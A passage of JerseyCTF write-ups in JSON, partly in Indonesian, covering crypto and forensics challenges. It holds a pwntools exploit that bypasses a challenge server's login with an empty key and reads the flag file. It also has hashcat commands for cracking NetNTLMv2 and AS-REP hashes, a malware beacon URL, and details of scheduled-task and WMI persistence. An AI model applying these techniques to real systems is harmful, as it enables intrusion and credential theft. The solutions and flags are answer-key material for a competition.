        "code": "#!/usr/bin/env python3\r\nfrom pwn import remote\r\nimport io\r\nimport tarfile\r\nimport re\r\n\r\nHOST = \"tarpit.aws.jerseyctf.com\"\r\nPORT = 9001\r\n\r\n\r\ndef build_min_tar() -> bytes:\r\n    buf = io.BytesIO()\r\n    with tarfile.open(fileobj=buf, mode=\"w\") as tar:\r\n        data = b\"X\"\r\n        info = tarfile.TarInfo(\"x.txt\")\r\n        info.size = len(data)\r\n        tar.addfile(info, io.BytesIO(data))\r\n    return buf.getvalue()\r\n\r\n\r\ndef main():\r\n    payload = build_min_tar()\r\n    io_conn = remote(HOST, PORT)\r\n\r\n    io_conn.recvline(timeout=2)  # Python 3.12.8\r\n    io_conn.recvline(timeout=2)  # Ready to read in file\r\n\r\n    # Trigger state transition to login menu.\r\n    io_conn.send(payload)\r\n    io_conn.recvuntil(b\"pipe in a tar file\", timeout=3)\r\n\r\n    # Developer path\r\n    io_conn.sendline(b\"q\")\r\n    io_conn.recvuntil(b\"RSA KEY:\", timeout=3)\r\n\r\n    # Empty key bypasses auth and drops us into command execution.\r\n    io_conn.sendline(b\"\")\r\n    io_conn.recvuntil(b\"EXECUTING\\n\", timeout=3)\r\n\r\n    io_conn.sendline(b\"cat /chal/flag.txt\")\r\n    out = io_conn.recvline(timeout=3) or b\"\"\r\n    text = out.decode(errors=\"ignore\").strip()\r\n\r\n    m = re.search(r\"JCTF\\{[^}]+\\}\", text)\r\n    if m:\r\n        print(m.group(0))\r\n    else:\r\n        print(text)\r\n\r\n    io_conn.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "JCTF{Pl4cing_f1les_can_b3_just_4s_d4ng3rous_as_runn1ng_th3m}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-crypto-finalmessage",
    "title": "CTF — Final Message",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Crypto / Audio Steganography  \n**Difficulty:** Medium  \n**Flag:** `jctf{ВОСТОКПРИЗЕМЛИЛСЯ}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **Spectrogram Steganography** | Key hidden visually in frequency domain (`ЛАЙКА`) |\n| 2 | **Classical Cipher (Vigenere)** | Spoken ciphertext decrypted with repeating Cyrillic key |\n| 3 | **Radiotelephony Encoding** | Spoken words represent Cyrillic letter stream |\n\n---",
    "tools": [
      "sox",
      "spectrogram",
      "Python — Vigenere decryption automation"
    ],
    "analysis": "Generate spectrogram and inspect high-frequency area:\n\n```bash\nsox Final_Message.flac -n remix 1 spectrogram -x 3000 -y 1025 -z 120 -w Kaiser -o spec.png\n```\n\nHidden text appears in upper-right region:\n\n`ЛАЙКА`\n\nThis is the key hint.",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Our SIGINT operators picked up a strange AM broadcast a few days ago. Triangulation of the signal indicates it originated from an old Soviet numbers station known to be associated with the Soviet space program and spy satellites. Minutes later, the signal disappeared entirely from our scanners and has not returned. If you listen closely, you can hear a coded message being spoken. Our interns couldn't decrypt it, so it's up to you.\n>\n> Your objective is to analyze the audio file and retrieve the flag enciphered in the message.\n>\n> Note: The plaintext message is fully capitalized and uses Cyrillic characters. The flag format stays the same, for example, jctf{}.\n\n**File:** `Final_Message.flac` (48 kHz stereo, ~59.5s)\n\n---"
      },
      {
        "title": "Step 3 — Decode Spoken Codewords",
        "content": "The spoken message uses Russian radiotelephony words (e.g. `НИКОЛАЙ`, `ОЛЬГА`, `ЦАПЛЯ`, etc.) that map to Cyrillic letters.\n\nRecovered ciphertext:\n\n`НОЫЭОЦПЪУЗРМХУЛЭЯ`\n\nFrom spectrogram key:\n\n`ЛАЙКА`\n\n---"
      },
      {
        "title": "Step 4 — Vigenere Decryption (Cyrillic Alphabet)",
        "content": "Use full Russian alphabet (`АБВГДЕЁ...Я`) and decrypt ciphertext with key `ЛАЙКА`.\n\n\n\nDecryption result:\n\n`ВОСТОКПРИЗЕМЛИЛСЯ`",
        "code": "ALPHABET = \"АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ\"\nKEY = \"ЛАЙКА\"\nCIPHERTEXT = \"НОЫЭОЦПЪУЗРМХУЛЭЯ\""
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "Final_Message.flac\n      │\n      ▼\nSpectrogram analysis\n      │\n      ▼\nHidden key: \"ЛАЙКА\"\n      │\n      ▼\nDecode spoken radiotelephony words\n      │\n      ▼\nCiphertext: НОЫЭОЦПЪУЗРМХУЛЭЯ\n      │\n      ▼\nVigenere decrypt(key=\"ЛАЙКА\")\n      │\n      ▼\nВОСТОКПРИЗЕМЛИЛСЯ\n      │\n      ▼\njctf{ВОСТОКПРИЗЕМЛИЛСЯ}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nJerseyCTF - Final Message\r\n\r\nCiphertext and key are extracted from the audio challenge:\r\n  ciphertext: НОЫЭОЦПЪУЗРМХУЛЭЯ\r\n  key       : ЛАЙКА\r\n\"\"\"\r\n\r\nALPHABET = \"АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ\"\r\nKEY = \"ЛАЙКА\"\r\nCIPHERTEXT = \"НОЫЭОЦПЪУЗРМХУЛЭЯ\"\r\n\r\n\r\ndef vigenere_decrypt(ciphertext: str, key: str, alphabet: str) -> str:\r\n    pos = {c: i for i, c in enumerate(alphabet)}\r\n    out = []\r\n    for i, ch in enumerate(ciphertext):\r\n        k = key[i % len(key)]\r\n        out.append(alphabet[(pos[ch] - pos[k]) % len(alphabet)])\r\n    return \"\".join(out)\r\n\r\n\r\ndef main() -> None:\r\n    plaintext = vigenere_decrypt(CIPHERTEXT, KEY, ALPHABET)\r\n    flag = f\"jctf{{{plaintext}}}\"\r\n    print(\"ciphertext:\", CIPHERTEXT)\r\n    print(\"key:\", KEY)\r\n    print(\"plaintext:\", plaintext)\r\n    print(\"flag:\", flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "```\njctf{ВОСТОКПРИЗЕМЛИЛСЯ}\n```\n\n---",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-crypto-playfairpunch",
    "title": "CTF — Play Fair, Punch!",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Crypto / Classical Cipher  \n**Difficulty:** Medium  \n**Flag:** `jctf{SAMANDMISSSAMSPACEMACAQUEMONKEYS}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **Hollerith / Punch Card Decoding** | Data disimpan sebagai lubang baris-kolom pada kartu punch |\n| 2 | **Playfair Cipher** | Ciphertext hasil punch card didekripsi dengan key `PUNCH` |\n\n---",
    "tools": [
      "Python 3",
      "Pillow",
      "numpy",
      "Script custom untuk decode Hollerith + Playfair"
    ],
    "analysis": "```bash\nfile punch-card.png\n```\n\nChallenge hanya memberikan satu gambar punch card klasik (IBM-style). Dari judul **Play Fair, Punch!**, indikasi kuat mengarah ke:\n1. Data pada kartu punch (Hollerith encoding)\n2. Cipher klasik Playfair",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> The Ichikawa City Zoo has a well-kept secret regarding the lineage of their beloved rising star, Punch the Monkey. The only proof they have is this old punch card in the administrator's office. Can you figure out who it might be?\n\n**File:** `punch-card.png`\n\n---"
      },
      {
        "title": "Step 2 — Visual Pattern Recognition",
        "content": "Punch card berisi lubang-lubang hitam dalam grid baris/kolom. Barisnya cocok dengan layout IBM 12-row:\n\n`12, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9`\n\nDengan mendeteksi tiap hole sebagai pasangan `(kolom, baris)`, kita bisa decode tiap kolom menjadi karakter Hollerith.\n\n---"
      },
      {
        "title": "Step 3 — Extract Hole Matrix (Automated)",
        "content": "Solver membaca gambar, lalu:\n1. Konversi ke grayscale\n2. Scan 80 kolom punch dengan pitch tetap\n3. Untuk setiap cell, cek area inti apakah full black (`core < 40`)\n4. Simpan baris yang ter-punch\n\nHasil decode Hollerith:",
        "code": "OEGFDKGKRYRYOELTAGELGFPEWBFLRPLDCY"
      },
      {
        "title": "Step 4 — Decode as Playfair Cipher",
        "content": "Dari hint judul, string di atas didekripsi sebagai Playfair dengan key:\n\n\n\nHasil plaintext:\n\n\n\nString ini langsung cocok sebagai isi flag (uppercase) sesuai validasi challenge.\n\n---",
        "code": "PUNCH"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "punch-card.png\n      │\n      ▼\nExtract punch holes (grid scan)\n      │\n      ▼\nHollerith decode\n      │\n      ▼\nOEGFDKGKRYRYOELTAGELGFPEWBFLRPLDCY\n      │\n      ▼\nPlayfair decrypt (key = PUNCH)\n      │\n      ▼\nSAMANDMISSSAMSPACEMACAQUEMONKEYS\n      │\n      ▼\njctf{SAMANDMISSSAMSPACEMACAQUEMONKEYS}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom PIL import Image\r\nimport numpy as np\r\n\r\nIMG_PATH = 'punch-card.png'\r\nPLAYFAIR_KEY = 'PUNCH'\r\nFLAG_PREFIX = 'jctf'\r\n\r\n# IBM punch card row order (top -> bottom)\r\nROW_NAMES = ['12', '11', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']\r\nY_ROWS = [18, 61, 108, 144, 179, 216, 252, 288, 324, 359, 396, 432]\r\nX0 = 38\r\nPITCH = 13\r\nCELL_W = 7\r\nCELL_H = 14\r\n\r\nALPHA25 = 'ABCDEFGHIKLMNOPQRSTUVWXYZ'\r\n\r\n\r\ndef hollerith_to_char(rows):\r\n    rs = set(rows)\r\n    if len(rs) == 1:\r\n        d = next(iter(rs))\r\n        if d in '0123456789':\r\n            return d\r\n\r\n    if len(rs) == 2:\r\n        if '12' in rs:\r\n            d = (rs - {'12'}).pop()\r\n            if d in '123456789':\r\n                return 'ABCDEFGHI'[int(d) - 1]\r\n        if '11' in rs:\r\n            d = (rs - {'11'}).pop()\r\n            if d in '123456789':\r\n                return 'JKLMNOPQR'[int(d) - 1]\r\n        if '0' in rs:\r\n            d = (rs - {'0'}).pop()\r\n            if d in '23456789':\r\n                return 'STUVWXYZ'[int(d) - 2]\r\n\r\n    return '?'\r\n\r\n\r\ndef extract_card_text(path):\r\n    arr = np.array(Image.open(path).convert('L'))\r\n    cols = []\r\n\r\n    for c in range(80):\r\n        x = X0 + c * PITCH\r\n        if x + CELL_W > arr.shape[1]:\r\n            break\r\n\r\n        punched_rows = []\r\n        for i, y in enumerate(Y_ROWS):\r\n            patch = arr[y:y + CELL_H, x:x + CELL_W]\r\n            # A real punch-hole region is almost fully black.\r\n            core = patch[1:12, 1:6]\r\n            if (core < 40).all():\r\n                punched_rows.append(ROW_NAMES[i])\r\n\r\n        if punched_rows:\r\n            cols.append((c, punched_rows))\r\n\r\n    text = ''.join(hollerith_to_char(rows) for _, rows in cols)\r\n    return cols, text\r\n\r\n\r\ndef make_playfair_key(key):\r\n    key = ''.join(c for c in key.upper() if c.isalpha()).replace('J', 'I')\r\n    out = ''\r\n    for c in key + ALPHA25:\r\n        if c not in out:\r\n            out += c\r\n    return out\r\n\r\n\r\ndef playfair_decrypt(ct, key):\r\n    k = make_playfair_key(key)\r\n    pos = {k[i]: (i // 5, i % 5) for i in range(25)}\r\n\r\n    def at(r, c):\r\n        return k[r * 5 + c]\r\n\r\n    pt = []\r\n    for i in range(0, len(ct), 2):\r\n        a, b = ct[i], ct[i + 1]\r\n        ra, ca = pos[a]\r\n        rb, cb = pos[b]\r\n\r\n        if ra == rb:\r\n            pt.append(at(ra, (ca - 1) % 5))\r\n            pt.append(at(rb, (cb - 1) % 5))\r\n        elif ca == cb:\r\n            pt.append(at((ra - 1) % 5, ca))\r\n            pt.append(at((rb - 1) % 5, cb))\r\n        else:\r\n            pt.append(at(ra, cb))\r\n            pt.append(at(rb, ca))\r\n\r\n    return ''.join(pt)\r\n\r\n\r\ndef main():\r\n    _, ct = extract_card_text(IMG_PATH)\r\n    pt = playfair_decrypt(ct, PLAYFAIR_KEY)\r\n    cleaned = []\r\n    for i, ch in enumerate(pt):\r\n        if 0 < i < len(pt) - 1 and ch == 'X' and pt[i - 1] == pt[i + 1]:\r\n            continue\r\n        cleaned.append(ch)\r\n    cleaned_pt = ''.join(cleaned)\r\n    flag = f'{FLAG_PREFIX}{{{cleaned_pt}}}'\r\n\r\n    print('[+] Hollerith decoded:', ct)\r\n    print('[+] Playfair key:', PLAYFAIR_KEY)\r\n    print('[+] Playfair plaintext:', pt)\r\n    print('[+] Playfair cleaned:', cleaned_pt)\r\n    print('[+] Flag:', flag)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{SAMANDMISSSAMSPACEMACAQUEMONKEYS}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-coldwake",
    "title": "Cold Wake - Forensics",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "Writeup for challenge Cold Wake - Forensics",
    "problemDescription": "Challenge ini berisi 3 file gambar:\n- `Tape1.jpg`\n- `Tape2.jpg`\n- `Tape3.jpg`\n\nFormat flag: `JCTF{XXXXX-XXXXX-XXXXX}`\n\nDari narasi challenge, launch authorization dibagi menjadi 3 segmen dan tiap segmen disembunyikan dengan cara berbeda.",
    "tools": [],
    "analysis": "Lanjut metode serupa karena pattern-nya kemungkinan satu rangkaian:\n- `stegseek Tape3.jpg _pw2.txt` (wordlist kecil custom yang memuat `galaxy`)\n\nHasil:\n- Passphrase kembali ketemu: **`galaxy`**\n- Extract file: `Tape3.jpg.out` (MP3 pendek, ~4 detik)\n\nKemudian audio ditranskrip:\n- `whisper Tape3.jpg.out --model base.en --language en --task transcribe`\n\nOutput transkrip:\n- **\"One, nine, four, zero, eight.\"**\n- Segmen ketiga: **19408**",
    "solution": [
      {
        "title": "1) Initial Recon",
        "content": "Langkah awal:\n- `file Tape1.jpg Tape2.jpg Tape3.jpg`\n- `exiftool Tape1.jpg Tape2.jpg Tape3.jpg`\n- `strings` untuk triage cepat\n\nHasil penting:\n- `Tape1.jpg` punya metadata/comment mencurigakan:\n  - `ORBITAL LAB ARCHIVE :: SINGULARITY INIT SEGMENT :: SEQ=47291`\n- `Tape2.jpg` dan `Tape3.jpg` tampak seperti JPEG biasa (tanpa metadata jelas).\n\nSegmen pertama langsung terlihat kuat: **47291**."
      },
      {
        "title": "4) Korelasi Akhir",
        "content": "Tiga segmen yang didapat:\n1. `47291` (metadata Tape1)\n2. `80536` (gambar hasil extract Tape2)\n3. `19408` (audio hasil extract Tape3)\n\nMaka flag final:\n\n`JCTF{47291-80536-19408}`"
      },
      {
        "title": "Catatan",
        "content": "- Tidak pakai writeup internet.\n- Full analisis dilakukan dari artefak lokal challenge."
      }
    ],
    "terminalOutputs": [],
    "flag": "JCTF{XXXXX-XXXXX-XXXXX}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-concealesurveilance",
    "title": "CTF — Concealed Surveilance",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Forensics  \n**Difficulty:** Medium  \n**Flag:** `jctf{th3_commod0r3str@ted_!nt0_h@ve_inf1l_th3_apoll0!}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | Local Account Persistence | Akun `commodore64` dibuat sebagai Administrator, `AccountNeverExpires` |\n| 2 | Scheduled Task Persistence | Task palsu `\\Windows Update`, hidden + boot trigger + PowerShell payload |\n| 3 | WMI Persistence | `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding` |\n| 4 | Obfuscation | 4 fragmen flag disimpan dalam base64 di artefak berbeda |\n\n---",
    "tools": [
      "rg",
      "regripper",
      "iconv",
      "base64",
      "Python ("
    ],
    "analysis": "```bash\nls -la\nrg --files\n```\n\nTemuan awal:\n- Secondary profile: `Users/commodore64`\n- Script mencurigakan:\n  - `Users/Tony Wonder/Documents/test.ps1`\n  - `ProgramData/telemetry.ps1`\n- Scheduled task anomali:\n  - `Windows/System32/Tasks/Windows Update`",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Recently, rumors have arisen that Tony Wonder had access to Cold War secrets regarding confidential governmental contracts with IBM. They have been targeting Tony for some time, and it's our job to identify the espionage. Given this logical file containing parts of his system, can you?\n>\n> Identify more information about the secondary user on the machine.\n>\n> Identify the mediums of persistence that Soviets agents have.\n> there is four information fragments that need to be identified!\n>\n> hint: A description of who the secondary user would be a good start\n\n**Artifact:** logical Windows filesystem dump (`Users/`, `ProgramData/`, `Windows/`)\n\n---"
      },
      {
        "title": "Step 2 — Inspect Suspicious Scripts",
        "content": "`test.ps1` membuat akun `commodore64` sebagai Administrator dan menyimpan base64 di field Description.\n\n`telemetry.ps1` melakukan beacon ke:\n- `http://telemetry.apollo-xiiv.local/dHJAdGVkXyFudDA=/$c/$u/$t`\n\n---",
        "code": "sed -n '1,220p' ProgramData/telemetry.ps1\nsed -n '1,220p' Users/Tony\\ Wonder/Documents/test.ps1"
      },
      {
        "title": "Step 3 — Fragment #1 (Secondary User Description)",
        "content": "Dari `test.ps1`:\n\n\nDecode:",
        "code": "New-LocalUser ... -Description \"amN0Znt0aDNfY29tbW9kMHIzcw\""
      },
      {
        "title": "Step 4 — Fragment #2 (Telemetry Token)",
        "content": "Dari `telemetry.ps1`:\n\n\nDecode:",
        "code": ".../dHJAdGVkXyFudDA=/$c/$u/$t"
      },
      {
        "title": "Step 5 — Persistence Medium #1: Malicious Scheduled Task",
        "content": "Analisis task:\n\n\nTemuan:\n- `Author`: `APOLLO-XIIV\\commodore64`\n- Hidden scheduled task\n- Trigger: `BootTrigger`\n- Action:\n  \n\nTask Description berisi fragment:\n- `X2hAdmVfaW5mMWw`\n\nDecode:",
        "code": "iconv -f UTF-16LE -t UTF-8 'Windows/System32/Tasks/Windows Update'"
      },
      {
        "title": "Step 6 — Persistence Medium #2: WMI Permanent Event Subscription",
        "content": "Dari command history:\n\n\nTerlihat pembuatan:\n- `__EventFilter` (`WindowsTelemetryFilter`)\n- `CommandLineEventConsumer` (`WindowsTelemetryConsumer`)\n- `__FilterToConsumerBinding`\n\nConsumer menjalankan:\n\n\nJuga ditemukan base64 fragment:\n- `X3RoM19hcG9sbDAhfQ==`\n\nDecode:\n\n\n---",
        "code": "sed -n '1,240p' Users/commodore64/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "Logical File Dump\n      │\n      ▼\nFind suspicious artifacts (test.ps1, telemetry.ps1, Windows Update task)\n      │\n      ▼\nDecode base64 fragments from:\n- user description\n- telemetry URI token\n- task description\n- PSReadLine (WMI setup)\n      │\n      ▼\nCorrelate persistence mediums:\n- Scheduled Task\n- WMI subscription\n      │\n      ▼\njctf{th3_commod0r3str@ted_!nt0_h@ve_inf1l_th3_apoll0!}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport base64\r\n\r\nfragments_b64 = {\r\n    \"frag1\": \"amN0Znt0aDNfY29tbW9kMHIzcw\",       # test.ps1 description\r\n    \"frag2\": \"dHJAdGVkXyFudDA=\",               # telemetry.ps1 URI token\r\n    \"frag3\": \"X2hAdmVfaW5mMWw\",               # fake Windows Update task description\r\n    \"frag4\": \"X3RoM19hcG9sbDAhfQ==\",           # PSReadLine / WMI persistence description\r\n}\r\n\r\ndef b64d(s: str) -> str:\r\n    pad = \"=\" * ((4 - len(s) % 4) % 4)\r\n    return base64.b64decode((s + pad).encode()).decode(errors=\"replace\")\r\n\r\nparts = [b64d(fragments_b64[f\"frag{i}\"]) for i in range(1, 5)]\r\nflag = \"\".join(parts)\r\n\r\nprint(\"[+] Decoded fragments:\")\r\nfor i, p in enumerate(parts, 1):\r\n    print(f\"  {i}. {p}\")\r\n\r\nprint(\"\\n[+] Flag:\")\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{th3_commod0r3str@ted_!nt0_h@ve_inf1l_th3_apoll0!}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-filetransfer",
    "title": "CTF — file-transfer",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Forensics / Network Forensics  \n**Difficulty:** Medium  \n**Flag:** `jctf{Dah914znHQigIolS-j7xvL5XiYooM4Uce}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **Weak Password Policy** | User memakai password lemah (`password`) dan bisa di-crack dari NetNTLMv2 |\n| 2 | **SMB3 Decryption via NTLM Password** | Setelah password diketahui, encrypted SMB session dapat dianalisis |\n| 3 | **XOR Obfuscation** | Payload C2 hanya di-obfuscate XOR dengan key statis, mudah dipulihkan dari binary |\n\n---",
    "tools": [
      "tshark",
      "hashcat",
      "r2",
      "Python — decoding XOR payload dan ekstraksi flag"
    ],
    "analysis": "```bash\nfile export.pcap\n\ncapinfos export.pcap\n```",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Our network security solution has alerted us to some suspicious traffic from a user's workstation. Can you help us figure out what is going on?  \n> This is the 3rd time this month something happened with this user, we really need to improve our password policies...\n\n**File:** `export.pcap` (PCAP network capture, 109 packets)\n\n---"
      },
      {
        "title": "Step 2 — Protocol Triage",
        "content": "Traffic didominasi SMB/SMB2, dengan banyak paket SMB3 terenkripsi.",
        "code": "tshark -r export.pcap -q -z io,phs"
      },
      {
        "title": "Step 3 — Quick String Checks",
        "content": "Tidak ada flag langsung. Maka analisis lanjut dilakukan di layer autentikasi dan stream terenkripsi.\n\n---",
        "code": "strings -n 6 export.pcap | grep -Ei 'flag|ctf|password|user|login'"
      },
      {
        "title": "Step 4 — Extract NTLMv2 Auth Data",
        "content": "Dari SMB Session Setup terlihat user:\n- `IT640\\operator1`\n\nHash NTLMv2 diekstrak dari traffic dan diformat untuk cracking."
      },
      {
        "title": "Step 5 — Crack Weak Password",
        "content": "Hasil:\n- Password user `operator1` = `password`\n\nIni cocok dengan hint challenge soal kebijakan password buruk.",
        "code": "hashcat -m 5600 -a 0 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt"
      },
      {
        "title": "Step 6 — Decrypt SMB3 and Export Transferred File",
        "content": "Dengan password cleartext, dekripsi SMB3 bisa dilakukan di tshark:\n\n\n\nTerlihat file yang di-upload ke share SMB:\n- `DaVinci.exe`\n\nEkstraksi objek SMB:\n\n\n\nHasil: `extracted/%5cDaVinci.exe`",
        "code": "tshark -r export.pcap -o ntlmssp.nt_password:password -T fields -e frame.number -e _ws.col.Info"
      },
      {
        "title": "Step 7 — Reverse Malware Command Channel",
        "content": "Dari string dan disassembly `DaVinci.exe` ditemukan:\n- C2 endpoint: `10.1.2.211:55544`\n- Sequence command: `CMD-SEQ-A`, `CMD-SEQ-B`, `CMD-SEQ-C`, `CMD-SEQ-D`\n- XOR key hardcoded: `sorry_im_not_the_flag_:)`\n\nStream TCP C2 diambil dari `tcp.stream==0`, lalu payload server didekode XOR berulang dengan key di atas."
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "export.pcap\n    │\n    ▼\nSMB2/SMB3 traffic analysis\n    │\n    ▼\nExtract NTLMv2 auth material\n    │\n    ▼\nCrack password (operator1:password)\n    │\n    ▼\nDecrypt SMB3 + export DaVinci.exe\n    │\n    ▼\nReverse C2 protocol + XOR key recovery\n    │\n    ▼\nDecode C2 response payload\n    │\n    ▼\njctf{Dah914znHQigIolS-j7xvL5XiYooM4Uce}"
      },
      {
        "title": "Installation",
        "content": "",
        "code": "sudo apt update\nsudo apt install -y tshark hashcat radare2\n\npython3 solve.py export.pcap"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nKEY = b\"sorry_im_not_the_flag_:)\"\r\n\r\n\r\ndef run_tshark_extract(pcap_path: str):\r\n    cmd = [\r\n        \"tshark\",\r\n        \"-r\",\r\n        pcap_path,\r\n        \"-Y\",\r\n        \"tcp.stream==0 && ip.src==10.1.2.211 && tcp.len>0\",\r\n        \"-T\",\r\n        \"fields\",\r\n        \"-e\",\r\n        \"data\",\r\n    ]\r\n    out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL)\r\n    return [line.strip() for line in out.splitlines() if line.strip()]\r\n\r\n\r\ndef xor_decode(hex_blob: str) -> str:\r\n    raw = bytes.fromhex(hex_blob)\r\n    decoded = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(raw))\r\n    return decoded.decode(\"latin1\", errors=\"ignore\")\r\n\r\n\r\ndef main():\r\n    pcap = sys.argv[1] if len(sys.argv) > 1 else \"export.pcap\"\r\n    if not Path(pcap).exists():\r\n        print(f\"[-] File tidak ditemukan: {pcap}\")\r\n        return 1\r\n\r\n    try:\r\n        blobs = run_tshark_extract(pcap)\r\n    except Exception as e:\r\n        print(f\"[-] Gagal ekstrak data dari tshark: {e}\")\r\n        return 1\r\n\r\n    if not blobs:\r\n        print(\"[-] Tidak ada payload yang cocok di stream C2\")\r\n        return 1\r\n\r\n    decoded_msgs = [xor_decode(b) for b in blobs]\r\n\r\n    flag = None\r\n    for msg in decoded_msgs:\r\n        m = re.search(r\"jctf\\{[^}]+\\}\", msg)\r\n        if m:\r\n            flag = m.group(0)\r\n            break\r\n\r\n    if not flag:\r\n        print(\"[-] Flag tidak ditemukan\")\r\n        print(\"\\n[DEBUG] Decoded messages:\")\r\n        for i, m in enumerate(decoded_msgs, 1):\r\n            print(f\"{i}. {m}\")\r\n        return 1\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{Dah914znHQigIolS-j7xvL5XiYooM4Uce}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-foren-galagaarchive",
    "title": "CTF — Galaga Archive",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Forensics / Network Forensics  \n**Difficulty:** Medium  \n**Flag:** `jctf{roasted_galatic_invaders}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **Network Artifact Leakage** | File sensitif dibagikan lewat SMB dan bisa diekstrak dari PCAP |\n| 2 | **Weak Kerberos Exposure** | Akun dapat di-AS-REP roast dan password berhasil di-crack |\n| 3 | **Custom Crypto Misuse** | XOR stream berbasis SHA256(password) tanpa proteksi tambahan |\n\n---",
    "tools": [
      "tshark",
      "hashcat",
      "Python — dekripsi XOR berbasis SHA256"
    ],
    "analysis": "```bash\ntshark -r galaga_galaxy_invaders2.pcap --export-objects smb,extracted\nls extracted\n```\n\nDidapat file penting:\n- `galatic_galaga_sequel.txt`\n- `ideas1.txt`\n- `ideas2.txt`\n- `Shareholder_Meeting_Linkedin_POST.txt`\n\nIsi `galatic_galaga_sequel.txt` memberi clue enkripsi:\n- pesan di-XOR berulang menggunakan `SHA256(password)`\n- password berasal dari akun *tech developer*\n\n---",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> I heard rumors that there has been work on a second sequel to the original 1980's Galaga game! I was able to listen to some activity on their network, but it looks like I needed some authentication to reach the shared archive.\n\n**File:** `galaga_galaxy_invaders2.pcap`\n\n---"
      },
      {
        "title": "Step 2 — Protocol Triage",
        "content": "Protokol dominan:\n- SMB2 (akses file share)\n- Kerberos (autentikasi AD)\n- LDAP (directory query)\n- DNS\n\nIni cocok dengan narasi challenge: butuh autentikasi untuk masuk shared archive.",
        "code": "tshark -r galaga_galaxy_invaders2.pcap -q -z io,phs"
      },
      {
        "title": "Step 4 — Ambil Kredensial dari Kerberos (AS-REP Roasting)",
        "content": "Di trafik Kerberos terlihat user domain yang bisa di-*roast* (`galatic`). Lalu diekstrak ke format hashcat mode 18200 dan di-crack pakai rockyou:\n\n\n\nPassword yang berhasil didapat:",
        "code": "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
      },
      {
        "title": "Step 5 — Dekripsi `ideas1.txt`",
        "content": "Pakai rumus dari clue:\n- key stream = `SHA256(password)`\n- ciphertext di-XOR berulang dengan key stream\n\nHasil `ideas1.txt` jadi plaintext valid (update internal dev note), jadi metode dan password benar."
      },
      {
        "title": "Step 6 — Dekripsi `ideas2.txt` + Sinkronisasi Offset",
        "content": "`ideas2.txt` awalnya belum langsung kebaca pada offset default. Setelah diuji rotasi offset key 0..31, offset `10` menghasilkan plaintext jelas dan memuat flag:\n\n\n\n---",
